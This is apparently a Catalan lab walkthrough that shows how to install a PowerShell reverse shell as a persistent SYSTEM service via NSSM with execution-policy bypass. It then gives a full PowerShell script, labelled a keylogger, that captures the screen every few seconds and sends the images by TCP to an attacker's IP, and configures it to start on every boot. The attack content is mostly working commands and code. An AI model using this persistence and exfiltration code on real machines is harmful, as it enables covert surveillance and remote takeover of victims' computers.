### Apartat 1. Reverse Shell amb Powershell sent usuari nt authority\system

<img width="505" height="288" alt="imatge" src="https://github.com/user-attachments/assets/4c37c9e0-e4d6-4482-9e59-7ccdd4253b6c" />

Obrim Powershell com a administrador.

<img width="575" height="198" alt="imatge" src="https://github.com/user-attachments/assets/6f57d0c2-9393-469d-8bc9-cec91fdadeb6" />

Comprovem que NSSM funciona.

<img width="815" height="630" alt="imatge" src="https://github.com/user-attachments/assets/b3179260-227e-4d8a-b064-3dbe4f73bffe" />

Generem el nostre script de reverse shell.

<img width="609" height="474" alt="imatge" src="https://github.com/user-attachments/assets/181898b5-3144-4a14-8df4-04a560e36568" />

El guardem amb format ps1.

<img width="578" height="279" alt="imatge" src="https://github.com/user-attachments/assets/cf59f24b-bfad-4441-9f1d-06feb62a10b0" />

Executem aquesta comanda i ens obrirà l'eina per instal·lar el servei de forma gràfica.

<img width="427" height="227" alt="imatge" src="https://github.com/user-attachments/assets/9628220d-62e5-42d1-b548-c8d167a1be95" />

Configurem els paràmetres;

Path (la ruta de Powershell)
```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```
Startup directory (on tinguem guardat el script ps1)
```bash
C:\Users\Usuari\Desktop\servei-nssm
```
Arguments
```bash
-ExecutionPolicy Bypass -NoProfile -File C:\Users\Usuari\Desktop\servei-nssm\script.ps1
```

<img width="424" height="232" alt="imatge" src="https://github.com/user-attachments/assets/9bc5273f-9677-4c08-8fe3-7789e22366e9" />
<img width="298" height="148" alt="imatge" src="https://github.com/user-attachments/assets/0e480d2f-d977-47a1-b97f-56089d0c9a3a" />

A la pestanya "details" posem un nom al servei. Després fem click sobre Install Service.

<img width="725" height="51" alt="imatge" src="https://github.com/user-attachments/assets/b55bb47a-4878-4e19-8e7f-7302b08fa639" />

Executem aquesta comanda per habilitar que s'encengui al arrancar el ordinador.

```bash
.\nssm.exe set ServeiSP1 Start SERVICE_AUTO_START
```
<img width="596" height="197" alt="imatge" src="https://github.com/user-attachments/assets/8b0574a1-174b-46bc-a3d6-cb3529cb55b6" />

Iniciem el servei i comprovem que funcioni. 

<img width="889" height="584" alt="imatge" src="https://github.com/user-attachments/assets/30255359-7c06-4370-b17c-4a456dde43b9" />

A services.msc podem veure que el servei està efectivament actiu.

Ara comprovem que la reverse shell funciona reiniciant l'ordinador. Haurem de tenir un nc escoltant al port 4444.

### Apartat 2. Keylogger amb enviament de dades a TCP.

<img width="855" height="614" alt="imatge" src="https://github.com/user-attachments/assets/2dcd8921-8836-404c-af5b-de8c1fb7b3ae" />

Creem un script python al ordinador que actuarà com servidor. 

<img width="814" height="130" alt="imatge" src="https://github.com/user-attachments/assets/1b712393-dbe7-4168-8f3f-16915596df6a" />

Ens assegurem que tinguem pil instal·lat.

<img width="690" height="618" alt="imatge" src="https://github.com/user-attachments/assets/0abac98d-a30c-4777-b27e-4518992f421b" />

Creem un script ps1 en un directori accessible com _C:\Users\Public_. 

```bash
$ip   = "192.168.x.x"   # IP de l'atacant
$port = 4446
$interval = 3

Add-Type -AssemblyName System.Windows.Forms,System.Drawing

while ($true) {
    try {
        $bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
        $g = [Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)

        $ms = New-Object System.IO.MemoryStream
        $bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Jpeg)
        $bytes = $ms.ToArray()

        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ip, $port)
        $stream = $client.GetStream()
        $stream.Write($bytes, 0, $bytes.Length)
        $stream.Close()
        $client.Close()

        $bmp.Dispose(); $g.Dispose(); $ms.Dispose()
    } catch { }

    Start-Sleep -Seconds $interval
}
```

<img width="928" height="311" alt="imatge" src="https://github.com/user-attachments/assets/91f18b95-005d-4705-8a5c-b85f0743f7c2" />

Configurem l'arrancada i després reiniciem l'ordinador.
